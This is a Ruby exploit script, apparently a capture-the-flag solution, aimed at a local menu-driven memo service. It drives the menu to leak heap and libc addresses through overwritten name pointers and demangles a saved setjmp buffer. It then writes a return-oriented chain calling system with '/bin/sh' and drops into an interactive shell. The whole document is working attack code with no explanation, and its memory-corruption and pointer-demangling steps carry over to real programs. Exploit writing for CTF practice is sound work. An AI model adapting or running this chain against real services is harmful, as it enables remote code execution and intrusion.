#!/usr/bin/env ruby
require '~/pwnlib.rb'
require 'bit-twiddle/core_ext'

host, port = '127.0.0.1', 4445

def add()
	@r.recv_until("6. Bye :)")
	@r.send("1\n")
end
def showname(id)
	@r.recv_until("6. Bye :)")
	@r.send("4\n")
	@r.recv_until("ID:")
	@r.send("#{id}\n")
end
def showmemo(id)
	@r.recv_until("6. Bye :)")
	@r.send("5\n")
	@r.recv_until("ID:")
	@r.send("#{id}\n")
end
def memo(id, memo)
	@r.recv_until("6. Bye :)")
	@r.send("3\n")
	@r.recv_until("ID:")
	@r.send("#{id}\n")
	@r.recv_until("Input memo:")
	@r.send("#{memo}\n")
end
def name(id, name)
	@r.recv_until("6. Bye :)")
	@r.send("2\n")
	@r.recv_until("ID:")
	@r.send("#{id}\n")
	@r.recv_until("Input name:")
	@r.send("#{name}\n")
end
def quit()
	@r.recv_until("6. Bye :)")
	@r.send("6\n")
end
def p64(*addr)
	return addr.pack("Q*")
end
PwnTube.open(host, port) do |r|
	@r = r
	libc_start_main_got = 0x601fb0
	libc_start_main_offset = 0x0000000000021a20
	system_offset = 0x423f0
	sh_offset = 0x011b60
	message = 0x603140
	setjmp = 0x400c31
	pop_rdi_ret = 0x0000000000400cc3# : pop rdi ; ret

	add()
	memo(0, "p"*32)
	showmemo(0)
	@r.recv(32)
	heap = @r.recv().ljust(8, "\x00").unpack("Q")[0]
	check= heap-0x110
	message = check+0x30
	puts "[!] heap : 0x#{heap.to_s(16)}"
	puts "[!] check: 0x#{check.to_s(16)}"
	
	add()
	memo(0, "p"*33)
	name(0, "a"*8+p64(libc_start_main_got)+"\n")
	showname(1)
	libc_base = @r.recv(6).ljust(8, "\x00").unpack("Q")[0] - libc_start_main_offset
	system = libc_base + system_offset
	sh = libc_base + sh_offset
	puts "[!] libc base : 0x#{libc_base.to_s(16)}"
	
	name(0, "a"*8+p64(message)+"\n")
	showname(1)
	rsp_s = @r.recv(8).unpack("Q")[0]
	rip_s = @r.recv(8).unpack("Q")[0]
	
	ret_rsp = (rip_s.rrot64(0x11)^setjmp) ^ rsp_s.rrot64(0x11)+0x10
	puts "[!] ret addr : 0x#{ret_rsp.to_s(16)}"
	
	payload = "z"*8
	payload << p64(pop_rdi_ret,sh,system)
	name(0, "a"*8+p64(ret_rsp)+"\n")	
	name(1, payload)
	29.times do |i|
		add()
	end
	@r.interactive()
end
